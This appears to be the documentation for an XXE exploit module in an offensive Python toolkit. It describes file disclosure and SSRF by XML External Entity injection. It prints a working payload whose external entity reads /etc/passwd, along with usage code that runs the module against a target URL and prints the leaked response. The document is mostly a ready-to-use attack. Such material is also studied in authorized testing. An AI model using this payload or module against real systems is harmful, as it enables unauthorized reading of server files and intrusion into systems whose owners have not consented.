XXE Exploit Module

Description

XML External Entity Injection exploitation with file disclosure and SSRF.

Payloads

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

Usage

from exploits.xxe_exploit import XXEExploit

xxe = XXEExploit()
result = xxe.execute("https://target.com/xml")
if result["vulnerable"]:
    print("XXE found!")
    print(result["responses"][0])
